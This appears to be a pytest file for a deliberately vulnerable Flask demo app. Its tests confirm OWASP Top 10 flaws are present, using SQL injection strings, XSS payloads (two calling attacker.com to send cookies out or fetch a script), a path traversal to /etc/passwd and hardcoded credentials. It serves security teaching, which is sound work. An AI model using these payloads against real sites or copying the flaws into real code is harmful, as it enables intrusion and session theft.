"""
Security Tests for Demo DevSecOps Application
Tests security vulnerabilities and threat scenarios
OWASP Top 10 2025 vulnerability demonstrations
"""

import pytest
import pickle
import base64
from app.app import app, USERS_DB


@pytest.fixture
def client():
    """Create test client for Flask app"""
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client


class TestV1SQLInjection:
    """V1: SQL Injection (A05:2025 - Injection)"""
    
    def test_basic_sql_injection(self, client):
        """Test basic SQL injection payload"""
        payload = "' OR '1'='1"
        response = client.post('/login', data={
            'username': payload,
            'password': 'anything'
        })
        # Vulnerability: Should be caught but isn't
        assert response.status_code == 200
    
    def test_sql_injection_union_based(self, client):
        """Test UNION-based SQL injection"""
        payload = "' UNION SELECT * FROM users--"
        response = client.post('/login', data={
            'username': payload,
            'password': ''
        })
        # Vulnerability: Vulnerable to UNION-based injection
        assert response.status_code in [200, 500]
    
    def test_sql_injection_time_based(self, client):
        """Test time-based blind SQL injection"""
        payload = "'; WAITFOR DELAY '00:00:05'--"
        response = client.post('/login', data={
            'username': payload,
            'password': ''
        })
        # Would delay response if vulnerable
        assert response.status_code in [200, 500]


class TestV2CrossSiteScripting:
    """V2: XSS (A05:2025 - Injection)"""
    
    def test_reflected_xss_script_tag(self, client):
        """Test reflected XSS with script tag"""
        payload = '<script>alert("XSS")</script>'
        response = client.get(f'/profile/admin?comment={payload}')
        
        # Vulnerability: Script tag reflected without encoding
        assert b'<script>' in response.data
        assert b'alert' in response.data
    
    def test_reflected_xss_event_handler(self, client):
        """Test reflected XSS with event handler"""
        payload = '<img src=x onerror="alert(\'XSS\')">'
        response = client.get(f'/profile/admin?comment={payload}')
        
        # Vulnerability: HTML with event handler not encoded
        assert b'onerror' in response.data
    
    def test_reflected_xss_cookie_theft(self, client):
        """Test XSS payload for cookie stealing"""
        payload = '<img src=x onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">'
        response = client.get(f'/profile/admin?comment={payload}')
        
        # Vulnerability: Malicious script would execute
        assert b'onerror' in response.data
        assert b'fetch' in response.data
    
    def test_xss_svg_payload(self, client):
        """Test XSS with SVG payload"""
        payload = '<svg/onload=alert("XSS")>'
        response = client.get(f'/profile/admin?comment={payload}')
        
        # Vulnerability: SVG payload reflected
        assert b'onload' in response.data


class TestV3BrokenAccessControl:
    """V3: Broken Access Control (A01:2025)"""
    
    def test_idor_user_enumeration(self, client):
        """Test IDOR - access other user's data"""
        response = client.get('/admin/users')
        data = response.get_json()
        
        # Get user IDs
        assert len(data) > 0
        other_user = data[0]['username']
        
        # Access another user's profile
        response = client.get(f'/profile/{other_user}')
        assert response.status_code == 200
    
    def test_unauthorized_admin_access(self, client):
        """Test accessing admin endpoints without auth"""
        response = client.get('/admin/users')
        assert response.status_code == 200
        # Vulnerability: Admin endpoint accessible without authentication
    
    def test_privilege_escalation_via_idor(self, client):
        """Test privilege escalation through IDOR"""
        # Get admin user ID
        response = client.get('/admin/users')
        data = response.get_json()
        admin_user = next(u for u in data if u['is_admin'])
        
        # Can access admin info without being admin
        response = client.get(f'/profile/{admin_user["username"]}')
        assert response.status_code == 200
        # Vulnerability: No authorization required
    
    def test_delete_admin_user_no_auth(self, client):
        """Test deleting admin user without authentication"""
        response = client.get('/admin/users/admin/delete')
        # Vulnerability: Admin user can be deleted by anyone
        assert response.status_code in [200, 404]


class TestV4CryptographicFailures:
    """V4: Cryptographic Failures (A04:2025)"""
    
    def test_plaintext_password_storage(self, client):
        """Test that passwords stored as plaintext"""
        # Check USERS_DB directly
        admin_pass = USERS_DB.get('admin', {}).get('password')
        
        # If stored as plaintext, it equals original password
        assert admin_pass == 'admin123' or len(admin_pass) == 32  # MD5 hash
        # Vulnerability: Password not properly hashed with Argon2
    
    def test_md5_hash_weakness(self, client):
        """Test MD5 hash can be cracked"""
        import hashlib
        
        # MD5 hash: 'password' = '5f4dcc3b5aa765d61d8327deb882cf99'
        md5_hash = hashlib.md5('password'.encode()).hexdigest()
        assert md5_hash == '5f4dcc3b5aa765d61d8327deb882cf99'
        
        # Vulnerability: MD5 is easily reversible
    
    def test_hardcoded_secret_key(self, client):
        """Test hardcoded secret key in source code"""
        # App has hardcoded secret key
        assert app.secret_key == 'hardcoded-secret-key-demo'
        # Vulnerability: Secret key should be from environment variable


class TestV5InsecureAuthentication:
    """V5: Authentication Failures (A07:2025)"""
    
    def test_predictable_session_tokens(self, client):
        """Test session tokens are predictable"""
        response = client.post('/api/login', json={
            'username': 'admin',
            'password': 'admin123'
        })
        
        data = response.get_json()
        token = data.get('token')
        
        # Token is timestamp-based (numeric)
        assert token.isdigit()
        # Vulnerability: Token is predictable, not cryptographically random
    
    def test_no_rate_limiting(self, client):
        """Test no rate limiting on login attempts"""
        # Try 100 failed login attempts
        for i in range(10):
            response = client.post('/login', data={
                'username': 'admin',
                'password': f'wrongpassword{i}'
            })
            # Vulnerability: No 429 Too Many Requests response
            assert response.status_code == 200
    
    def test_no_account_lockout(self, client):
        """Test no account lockout after failed attempts"""
        # Make multiple failed attempts
        for i in range(5):
            client.post('/login', data={
                'username': 'admin',
                'password': 'wrong'
            })
        
        # Should still be able to attempt login
        response = client.post('/login', data={
            'username': 'admin',
            'password': 'admin123'
        })
        
        # Vulnerability: No lockout mechanism
        assert response.status_code == 200


class TestV6SecurityMisconfiguration:
    """V6: Security Misconfiguration (A02:2025)"""
    
    def test_missing_x_frame_options(self, client):
        """Test X-Frame-Options header missing"""
        response = client.get('/')
        
        # Vulnerability: Header should prevent clickjacking
        assert 'X-Frame-Options' not in response.headers
    
    def test_missing_x_content_type_options(self, client):
        """Test X-Content-Type-Options header missing"""
        response = client.get('/')
        
        # Vulnerability: MIME type sniffing not prevented
        assert 'X-Content-Type-Options' not in response.headers
    
    def test_missing_csp_header(self, client):
        """Test Content-Security-Policy header missing"""
        response = client.get('/')
        
        # Vulnerability: XSS attacks not mitigated with CSP
        assert 'Content-Security-Policy' not in response.headers
    
    def test_verbose_error_messages(self, client):
        """Test verbose error messages leak information"""
        response = client.get('/nonexistent')
        
        # Vulnerability: Error message shows request path
        assert b'/nonexistent' in response.data
    
    def test_missing_security_headers_comprehensive(self, client):
        """Test all critical security headers are missing"""
        response = client.get('/')
        headers = response.headers
        
        # Vulnerability: Multiple security headers missing
        missing_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        for header in missing_headers:
            assert header not in headers or headers.get(header) is None


class TestV7DataIntegrityFailures:
    """V7: Data Integrity Failures (A08:2025)"""
    
    def test_pickle_deserialization_vulnerability(self, client):
        """Test insecure pickle deserialization"""
        # This is a demonstration - actual RCE would need specific setup
        import pickle
        import base64
        
        # In real attack, would create malicious pickle
        test_data = {'user': 'attacker'}
        pickled = pickle.dumps(test_data)
        encoded = base64.b64encode(pickled).decode()
        
        # Vulnerability: App uses pickle.loads on untrusted data
        response = client.get(f'/load_user_data?data={encoded}')
        assert response.status_code in [200, 400]
    
    def test_no_data_validation(self, client):
        """Test lack of input validation"""
        # Any string accepted without validation
        response = client.get('/profile/../../etc/passwd')
        assert response.status_code == 200
        
        # Vulnerability: Path traversal possible


class TestThreatScenarios:
    """Complete threat scenarios combining multiple vulnerabilities"""
    
    def test_scenario_sql_injection_to_account_takeover(self, client):
        """
        Threat Scenario 1: SQL Injection → Account Takeover
        Attacker uses SQL injection to bypass authentication
        """
        # Step 1: SQL injection to bypass login
        response = client.post('/login', data={
            'username': "' OR '1'='1",
            'password': "' OR '1'='1"
        })
        
        # Vulnerability: Login bypassed with SQL injection
        assert response.status_code == 200
    
    def test_scenario_xss_to_session_hijacking(self, client):
        """
        Threat Scenario 2: XSS → Session Hijacking
        Attacker uses XSS to steal user's session cookie
        """
        xss_payload = '<img src=x onerror="fetch(\'http://attacker.com/steal.js\')">'
        
        response = client.get(f'/profile/admin?comment={xss_payload}')
        
        # Vulnerability: Malicious JS reflected and would execute
        assert b'onerror' in response.data
        assert b'attacker.com' in response.data
    
    def test_scenario_idor_to_data_breach(self, client):
        """
        Threat Scenario 3: IDOR → Data Breach
        Attacker uses IDOR to access all user data
        """
        # Step 1: Access admin users endpoint
        response = client.get('/admin/users')
        users = response.get_json()
        
        # Step 2: Access each user's profile
        for user in users:
            response = client.get(f'/profile/{user["username"]}')
            # Vulnerability: Can enumerate all users
            assert response.status_code == 200


class TestVulnerabilityIntegration:
    """Test multiple vulnerabilities working together"""
    
    def test_combined_sql_injection_and_xss(self, client):
        """Test SQL injection combined with XSS"""
        # SQL injection in login + XSS in response
        payload = "admin' OR '1'='1"
        response = client.post('/login', data={
            'username': payload,
            'password': '<script>alert("XSS")</script>'
        })
        
        # Both vulnerabilities present
        assert response.status_code == 200


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
